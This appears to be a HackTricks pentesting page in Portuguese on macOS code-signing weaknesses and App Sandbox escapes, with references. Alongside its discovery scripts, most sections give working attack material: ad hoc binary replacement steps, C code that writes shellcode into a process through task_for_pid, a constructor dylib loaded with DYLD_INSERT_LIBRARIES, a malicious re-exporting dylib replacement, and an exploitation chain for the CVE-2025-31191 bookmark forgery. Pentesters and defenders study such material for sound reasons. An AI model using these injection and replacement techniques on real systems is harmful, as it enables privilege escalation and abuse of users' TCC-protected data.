# Fraquezas de Code Signing do macOS e Sandbox Escapes

{{#include ../../../banners/hacktricks-training.md}}

## Binários com Assinatura Ad Hoc

### Informações Básicas

A **assinatura ad hoc** (`CS_ADHOC`) cria uma assinatura de código **sem cadeia de certificados**. Ela ainda calcula o hash do código assinado, portanto a validação pode detectar modificações, mas não fornece uma identidade de desenvolvedor que outro componente possa autenticar. Substituir e assinar novamente o executável produz um CodeDirectory/CDHash diferente.<sup>[[1]](#references)[[4]](#references)</sup>

Nos Macs com Apple Silicon, todos os executáveis exigem, no mínimo, uma assinatura ad hoc. Isso significa que você encontrará assinaturas ad hoc em muitas ferramentas de desenvolvimento, pacotes do Homebrew e utilitários de terceiros.

### Por Que Isso Importa

- **Nenhuma identidade de signatário verificável** — verificações que aceitam apenas um caminho, um status ad hoc ou um identificador não fixado não conseguem determinar quem produziu o binário.
- Binários ad hoc de terceiros em **posições privilegiadas** (FDA, daemons, helpers) são alvos prioritários quando o arquivo ou um diretório pai pode ser gravado.
- Uma verificação de TCC baseada em CDHash, designated-requirement ou requirement **detecta** a substituição. Uma política baseada em caminho pode não detectar; inspecione o requirement real e teste novamente o grant em vez de presumir que ele sobreviverá à nova assinatura.

### Descoberta
```bash
# Find ad-hoc signed binaries
find /usr/local /opt /Applications -type f -perm +111 -exec sh -c '
flags=$(codesign -dvv "{}" 2>&1 | grep "CodeDirectory flags")
echo "$flags" | grep -q "adhoc" && echo "AD-HOC: {}"
' \; 2>/dev/null

# Check a specific binary
codesign -dv --verbose=4 /path/to/binary 2>&1 | grep -E "Signature|flags|Authority"
# Ad-hoc shows: "Signature=adhoc" and no Authority lines
```
### Ataque: Binary Replacement
```bash
# If an ad-hoc signed daemon binary is in a writable location:
# 1. Check the binary's current capabilities
codesign -d --entitlements - /path/to/target 2>&1

# 2. Note its TCC grants in the database
sqlite3 ~/Library/Application\ Support/com.apple.TCC/TCC.db \
"SELECT service, auth_value FROM access WHERE client LIKE '%target%';"

# 3. Replace the binary (if location is writable)
cp /tmp/malicious-binary /path/to/target

# 4. Re-sign with ad-hoc signature (mimics the original)
codesign -s - /path/to/target

# 5. Relaunch and verify the effective grant. It survives only when the
#    authorization is path-based (or otherwise does not pin the old CDHash).
```
---

## Processos depuráveis (get-task-allow)

### Informações básicas

O **entitlement `com.apple.security.get-task-allow`** (ou flag `CS_GET_TASK_ALLOW`) permite que um debugger autorizado obtenha a task port do processo, mesmo quando o Hardened Runtime normalmente impediria isso. Um debugger bem-sucedido pode ler a memória, modificar registradores, injetar código e controlar a execução.<sup>[[3]](#references)</sup>

Isso é destinado **somente a builds de desenvolvimento**. No entanto, alguns binários de terceiros incluem esse entitlement em produção.

> [!CAUTION]
> Um binário de produção com `get-task-allow` é uma primitiva de exploração forte. `taskgated`, a identidade do chamador, o sandbox, os entitlements do debugger e a autorização do Developer Tools ainda afetam se um cliente específico pode obter a task port; teste com `lldb`/`debugserver` e também com o injector pretendido. Quando o attach é bem-sucedido, o código injetado é executado com os entitlements, as concessões de TCC e o contexto de segurança do alvo.

### Descoberta
```bash
# Find debuggable binaries
find /Applications /usr/local -type f -perm +111 -exec sh -c '
codesign -d --entitlements - "{}" 2>&1 | grep -q "get-task-allow.*true" && echo "DEBUGGABLE: {}"
' \; 2>/dev/null

# Using the scanner
sqlite3 /tmp/executables.db "
SELECT path, privileged FROM executables e
JOIN executable_capabilities ec ON e.id = ec.executable_id
JOIN capabilities c ON ec.capability_id = c.id
WHERE c.name = 'get_task_allow_signature'
ORDER BY e.privileged DESC;"
```
### Ataque: Task Port Injection
```c
#include <mach/mach.h>
#include <mach/mach_vm.h>

// Get the target's task port (requires get-task-allow on target)
mach_port_t task;
kern_return_t kr = task_for_pid(mach_task_self(), target_pid, &task);

if (kr == KERN_SUCCESS) {
// Allocate memory in target process
mach_vm_address_t addr = 0;
mach_vm_allocate(task, &addr, shellcode_size, VM_FLAGS_ANYWHERE);

// Write shellcode into target
mach_vm_write(task, addr, (vm_offset_t)shellcode, shellcode_size);

// Make it executable
mach_vm_protect(task, addr, shellcode_size, FALSE,
VM_PROT_READ | VM_PROT_EXECUTE);

// Create a remote thread to execute the shellcode
// The shellcode runs with ALL of the target's entitlements and TCC grants
}
```
---

## Sem Validação de Bibliotecas + Ambiente DYLD

### Limpeza da Validação de Bibliotecas em Runtime

O entitlement privado **`com.apple.private.security.clear-library-validation`** não desativa a validação de bibliotecas na inicialização do processo. Em vez disso, ele permite que o processo chame `csops(..., CS_OPS_CLEAR_LV, ...)` sobre si mesmo em runtime. O XNU então remove `CS_REQUIRE_LV | CS_FORCED_LV`, desde que o chamador tenha o entitlement e satisfaça as verificações adicionais do handler. Consequentemente, um processo pode se tornar um alvo viável para `library injection` somente depois de alcançar o caminho de código que remove a validação de bibliotecas.<sup>[[4]](#references)[[5]](#references)</sup>

### A Combinação Letal

Quando um binário possui **ambos**:<sup>[[3]](#references)</sup>
- `com.apple.security.cs.disable-library-validation` (carrega qualquer dylib)
- `com.apple.security.cs.allow-dyld-environment-variables` (aceita variáveis de ambiente DYLD)

Essa é uma combinação de alto valor para `code injection`, pois o Hardened Runtime permite tanto a biblioteca não confiável quanto a variável de ambiente DYLD. O contexto de inicialização ainda pode remover as variáveis DYLD (por exemplo, em caminhos de execução protegidos ou privilegiados); portanto, verifique a invocação exata em vez de tratar o par de entitlements como incondicional.

### Descoberta
```bash
# Find binaries with the deadly combo
find /Applications -type f -perm +111 -exec sh -c '
ents=$(codesign -d --entitlements - "{}" 2>&1)
echo "$ents" | grep -q "disable-library-validation.*true" && \
echo "$ents" | grep -q "allow-dyld-environment.*true" && \
echo "INJECTABLE: {}"
' \; 2>/dev/null

# Using the scanner (both flags)
sqlite3 /tmp/executables.db "
SELECT path, privileged, tccPermsStr FROM executables
WHERE noLibVal = 1 AND allowDyldEnv = 1
ORDER BY privileged DESC;"
```
### Ataque: DYLD_INSERT_LIBRARIES Injection
```bash
# 1. Create the injection dylib
cat > /tmp/inject.c << 'EOF'
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

__attribute__((constructor))
void injected(void) {
// This runs BEFORE main() in the target's process
// We inherit ALL of the target's:
// - Entitlements
// - TCC grants (camera, mic, FDA, etc.)
// - Sandbox exceptions
// - Mach port rights

FILE *f = fopen("/tmp/injected_proof.txt", "w");
fprintf(f, "Running as PID %d with target's privileges\n", getpid());
fclose(f);

// Example: if target has camera TCC, we can now capture video
// Example: if target has FDA, we can read any file
}
EOF

# 2. Compile the dylib
cc -shared -o /tmp/inject.dylib /tmp/inject.c

# 3. Inject into the target
DYLD_INSERT_LIBRARIES=/tmp/inject.dylib /path/to/noLibVal-dyldEnv-binary

# 4. Verify injection
cat /tmp/injected_proof.txt
```
---

## Exceções Temporárias do Sandbox

### Como Elas Enfraquecem o Sandbox

As exceções temporárias do Sandbox (`com.apple.security.temporary-exception.*`) criam brechas no App Sandbox:<sup>[[2]](#references)</sup>

| Exceção | O Que Permite |
|---|---|
| `temporary-exception.mach-lookup.global-name` | Conectar-se a serviços XPC/Mach de todo o sistema |
| `temporary-exception.files.absolute-path.read-write` | Ler/gravar arquivos fora do contêiner do app |
| `temporary-exception.iokit-user-client-class` | Abrir conexões de user-client do IOKit |
| `temporary-exception.shared-preference.read-only` | Ler as preferências de outros apps |
| `temporary-exception.files.home-relative-path.read-write` | Acessar paths relativos a `~` |

### Exceções de Mach-Lookup = Primitiva de Sandbox Escape

A exceção mais perigosa é **mach-lookup** — ela permite que um app em Sandbox se comunique com daemons privilegiados:
```bash
# Find apps with mach-lookup exceptions
find /Applications -name "*.app" -exec sh -c '
binary="$1/Contents/MacOS/$(defaults read "$1/Contents/Info.plist" CFBundleExecutable 2>/dev/null)"
[ -f "$binary" ] && {
ents=$(codesign -d --entitlements - "$binary" 2>&1)
echo "$ents" | grep -q "mach-lookup" && {
count=$(echo "$ents" | grep -c "mach-lookup")
echo "[$count exceptions] $(basename "$1")"
}
}
' _ {} \; 2>/dev/null | sort -rn
```
### Ataque: Sandbox Escape via Mach-Lookup
```
1. Compromise sandboxed app (renderer exploit, malicious document, etc.)
2. Read entitlements to discover mach-lookup exceptions
3. For each reachable service:
a. Connect via NSXPCConnection
b. Discover the service's protocol (class-dump, strings)
c. Fuzz each exposed method
4. Find a vulnerability in a privileged daemon
5. Exploit → code execution in the daemon's context (outside sandbox)
```
---

## Verificações de Assinatura de Código Não São Integridade do Cliente XPC

Um serviço XPC pode autenticar uma conexão extraindo o estado de assinatura de código do seu audit token e aceitando um **platform binary** da Apple ou um cliente que contenha `CS_REQUIRE_LV`/`CS_FORCED_LV`. Esses testes descrevem o executável e determinados flags do processo; eles não provam que o address space atual contém apenas código confiável. Pesquisas em serviços ImageCapture mostraram que um binário da Apple que permitia injeção, como `/bin/ls`, poderia carregar uma dylib do atacante por meio de `DYLD_INSERT_LIBRARIES` e, então, conectar-se como um cliente da plataforma. Uma verificação posterior dos flags de library validation também foi contornada antes de a Apple alterar o serviço para exigir seu entitlement de autorização privado no macOS 15.<sup>[[6]](#references)</sup>

### Workflow de Auditoria Ofensiva

1. Faça o reverse de `listener:shouldAcceptNewConnection:` (ou do handler XPC equivalente de baixo nível) e identifique decisões baseadas apenas em `isPlatformBinary`, `kSecCodeInfoFlags`, `CS_PLATFORM_BINARY`, `CS_REQUIRE_LV` ou `CS_FORCED_LV`.
2. Enumere os clientes assinados pela Apple que podem falar o protocolo e, em seguida, inspecione o Hardened Runtime e os entitlements. Uma assinatura de plataforma, por si só, não é evidência de que a injeção via DYLD está bloqueada.
3. Teste o candidato no **build do macOS alvo**. Se uma dylib de constructor for carregada, faça a conexão com o serviço a partir desse constructor para que o audit token pertença ao processo de plataforma aceito.
4. Teste novamente cada patch do fornecedor: adicionar outro flag mutável de status do processo à mesma decisão de autorização pode não remover a primitiva de confused deputy.
```bash
# Static triage of the intended client
codesign -dv --verbose=4 /bin/ls 2>&1 | grep -E 'flags=|Runtime Version|TeamIdentifier'
codesign -d --entitlements :- /bin/ls 2>/dev/null | plutil -p -

# Dynamic check using the constructor dylib created earlier in this page
DYLD_PRINT_LIBRARIES=1 DYLD_INSERT_LIBRARIES=/tmp/inject.dylib /bin/ls
```
> [!NOTE]
> O comportamento do DYLD, a política do AMFI e as verificações do lado do serviço mudam entre as versões do macOS. Uma falha contra um host totalmente atualizado não comprova que a mesma chain falhou na versão vulnerável.

---

## Security-Scoped Bookmark Forgery (CVE-2025-31191)

Security-scoped bookmarks persistem a escolha de arquivo de um usuário entre inicializações. Uma sandbox extension é vinculada ao boot, portanto o `ScopedBookmarkAgent` a valida e cria um bookmark de longa duração autenticado por HMAC; quando o app apresenta esse bookmark posteriormente, o agente o valida e emite uma nova sandbox extension. O segredo de assinatura é armazenado no login keychain, e uma chave por app é derivada usando o bundle identifier.<sup>[[7]](#references)</sup>

Nos sistemas afetados, a ACL do keychain impedia que um processo não confiável **lesse** o segredo `com.apple.scopedbookmarksagent.xpc`, mas não impedia sua exclusão. Um app comprometido em sandbox poderia substituir o item por um segredo conhecido e uma ACL controlada pelo atacante, derivar a chave HMAC específica do app, forjar entradas no bookmark plist gravável do container e solicitar ao `ScopedBookmarkAgent` que as trocasse por extensões de acesso a arquivos. Isso transformava qualquer aplicação em sandbox que usasse security-scoped bookmarks em um possível sandbox escape para acesso arbitrário a arquivos, sem uma interação adicional com o file-picker. A Apple corrigiu o problema nas atualizações de segurança de 31 de março de 2025.<sup>[[7]](#references)</sup>

### Triagem e Attack Chain
```bash
APP=/Applications/Target.app
BIN="$APP/Contents/MacOS/$(/usr/libexec/PlistBuddy -c 'Print :CFBundleExecutable' \
"$APP/Contents/Info.plist")"

# Identify apps that can persist app- or document-scoped file access
codesign -d --entitlements :- "$BIN" 2>/dev/null | plutil -p - | \
grep -E 'com.apple.security.files.bookmarks.(app|document)-scope'

# Locate app-managed bookmark stores; names and schemas are application-specific
find "$HOME/Library/Containers" -type f \
\( -iname '*securebookmark*.plist' -o -iname '*securebookmarks*.plist' \) 2>/dev/null

# Inspect metadata for the agent's generic-password item (normally not its secret)
security find-generic-password -s com.apple.scopedbookmarksagent.xpc
```
A sequência de exploração em um host vulnerável é:

1. Obter execução de código dentro de um app em sandbox que usa persistent scoped bookmarks.
2. Substituir o item de assinatura do keychain do agente por um segredo conhecido e uma ACL permissiva.
3. Calcular `HMAC-SHA256(key=known_secret, data=bundle_id)` e forjar um bookmark para um caminho útil no bookmark store gravável pelo app.
4. Acionar o caminho normal de resolução de bookmarks do aplicativo para que `ScopedBookmarkAgent` retorne uma sandbox extension.
5. Usar o novo acesso a arquivos para sobrescrever um alvo de execução ou dados fora da sandbox disponível para esse usuário.

Esta é uma **técnica para versões corrigidas**: use-a para entender o trust boundary e avaliar sistemas sem correção, não como uma suposição sobre as versões atuais. Para testes atuais, concentre-se na análise de bookmarks, no vínculo de identidade, no ciclo de vida do keychain item e no comportamento de confused deputy em torno do agente.

---

## Private Apple Entitlements

### O que são

Entitlements prefixados com `com.apple.private.*` fornecem acesso a **APIs internas da Apple** não documentadas nem disponíveis para desenvolvedores terceiros. Binaries de terceiros com private entitlements os obtiveram por meio de certificado empresarial, MDM ou distribuição fora da App Store.

### Private Entitlements perigosos

| Entitlement | Capacidade |
|---|---|
| `com.apple.private.tcc.manager` | Leitura/gravação completa do banco de dados do TCC |
| `com.apple.private.tcc.allow` | Acesso a serviços específicos do TCC |
| `com.apple.private.security.no-sandbox` | Executar sem sandbox |
| `com.apple.private.iokit` | Acesso direto a drivers do IOKit |
| `com.apple.private.kernel.\*` | Acesso à interface do kernel |
| `com.apple.private.xpc.launchd.job-label` | Registrar/gerenciar jobs do launchd |
| `com.apple.rootless.install` | Gravar em caminhos protegidos pelo SIP |

### Descoberta
```bash
# Find third-party binaries with private entitlements
find /Applications /usr/local -type f -perm +111 -exec sh -c '
ents=$(codesign -d --entitlements - "{}" 2>&1)
echo "$ents" | grep -q "com.apple.private" && {
echo "=== {} ==="
echo "$ents" | grep "com.apple.private" | head -10
}
' \; 2>/dev/null

# Using the scanner
sqlite3 /tmp/executables.db "
SELECT path FROM executables
WHERE privateEnts = 1 AND isAppleBin = 0
ORDER BY privileged DESC;"
```
---

## Perfis de Sandbox Personalizados (SBPL)

### O que são

Os binários podem incluir **perfis de sandbox personalizados** escritos em SBPL (Seatbelt Profile Language). Esses perfis podem ser mais restritivos OU **mais permissivos** que o App Sandbox padrão.

### Auditoria de Perfis Personalizados
```bash
# Find custom sandbox profiles
find /Applications /System -name "*.sb" -o -name "*.sbpl" 2>/dev/null

# Dangerous SBPL rules to flag during audit:
# (allow file-write*)         — Write to ANY file
# (allow process-exec*)       — Execute ANY process
# (allow mach-lookup*)        — Connect to ANY Mach service
# (allow network*)            — Full network access
# (allow iokit*)              — Full IOKit access
# (allow file-read*)          — Read ANY file

# Example: Audit a sandbox profile for overly permissive rules
cat /path/to/custom.sb | grep "(allow" | sort -u
```
---

## Caminhos de Bibliotecas com Permissão de Escrita

### O Que São

Quando um binário carrega uma biblioteca dinâmica a partir de um caminho no qual o usuário atual tem permissão de **escrita**, a biblioteca pode ser substituída por código malicioso.

### Descoberta
```bash
# Using the scanner — find privileged binaries loading from writable paths
sqlite3 /tmp/executables.db "
SELECT e.path, e.privileged
FROM executables e
JOIN executable_capabilities ec ON e.id = ec.executable_id
JOIN capabilities c ON ec.capability_id = c.id
WHERE c.name = 'execs_writable_path'
ORDER BY e.privileged DESC
LIMIT 30;"

# Manual check: list library dependencies and check writability
otool -L /path/to/binary | awk '{print $1}' | while read lib; do
[ -f "$lib" ] && [ -w "$lib" ] && echo "WRITABLE: $lib"
done
```
### Ataque: Dylib Replacement
```bash
# 1. Find the writable library
otool -L /path/to/target-daemon | grep "/usr/local\|/opt\|Library"

# 2. Back up the original
cp /path/to/writable.dylib /tmp/original.dylib

# 3. Create a replacement that re-exports the original
cat > /tmp/evil.c << 'EOF'
#include <stdio.h>
__attribute__((constructor))
void evil(void) {
system("id > /tmp/escalated.txt");
}
EOF
cc -shared -o /tmp/evil.dylib /tmp/evil.c \
-Wl,-reexport_library,/tmp/original.dylib

# 4. Replace the library
cp /tmp/evil.dylib /path/to/writable.dylib

# 5. When the daemon restarts, it loads the evil dylib with daemon privileges
```
## References

- [1] [Apple Developer — Guia de assinatura de código](https://developer.apple.com/library/archive/technotes/tn2206/_index.html)
- [2] [Apple Developer — App Sandbox](https://developer.apple.com/library/archive/documentation/Security/Conceptual/AppSandboxDesignGuide/AboutAppSandbox/AboutAppSandbox.html)
- [3] [Apple Developer — Entitlements](https://developer.apple.com/documentation/bundleresources/entitlements)
- [4] [XNU — `bsd/sys/codesign.h` (operações `CS_OPS_*` e `CLEAR_LV_ENTITLEMENT`)](https://github.com/apple-oss-distributions/xnu/blob/main/bsd/sys/codesign.h)
- [5] [XNU — `bsd/kern/kern_proc.c` (handler de `csops` / `CS_OPS_CLEAR_LV`)](https://github.com/apple-oss-distributions/xnu/blob/main/bsd/kern/kern_proc.c)
- [6] [Uma nova era de escapes do App Sandbox do macOS: explorando uma superfície de ataque negligenciada e descobrindo mais de 10 novas vulnerabilidades](https://jhftss.github.io/A-New-Era-of-macOS-Sandbox-Escapes/)
- [7] [Analisando o CVE-2025-31191: um escape do App Sandbox baseado em bookmarks com escopo de segurança do macOS](https://www.microsoft.com/en-us/security/blog/2025/05/01/analyzing-cve-2025-31191-a-macos-security-scoped-bookmarks-based-sandbox-escape/)
{{#include ../../../banners/hacktricks-training.md}}
